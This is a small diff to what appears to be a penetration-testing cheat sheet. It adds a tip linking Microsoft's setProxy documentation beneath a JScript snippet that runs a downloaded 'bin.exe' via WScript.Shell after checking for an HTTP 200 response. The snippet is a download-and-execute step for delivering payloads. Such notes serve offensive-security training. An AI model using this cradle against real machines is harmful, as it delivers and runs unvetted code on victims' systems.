@@ -1302,6 +1302,7 @@ if (Object.Status == 200)
 
 var r = new ActiveXObject("WScript.Shell").Run("bin.exe");
 ```
+Use [setProxy](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms760236%28v%3dvs.85%29) to make it proxy aware.
 
 
 # Port Redirection and Tunneling
